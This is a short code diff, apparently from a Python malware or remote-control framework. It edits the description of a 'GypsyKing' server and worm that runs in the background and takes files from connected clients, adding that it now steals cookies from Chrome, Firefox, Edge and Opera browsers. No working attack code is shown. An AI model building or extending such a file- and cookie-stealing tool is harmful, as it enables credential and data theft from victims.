@@ -47,6 +47,6 @@ class BasicBot(BasicTemplate):
 class GypsyKing(AdvTemplate):
     SERV_TYPE = "GypsyKing"
     SERV_INFO = "Server to handle multiple Looter connection. Search and download files from client"
-    WORM_INFO = "Runs in background. Search and Robs files from client."
+    WORM_INFO = "Runs in background. Search and Robs files from client. Stealing cookies from: Chrome, Firefox, Edge, Opera, Opera GX"
     def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=LooterControler):
         super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
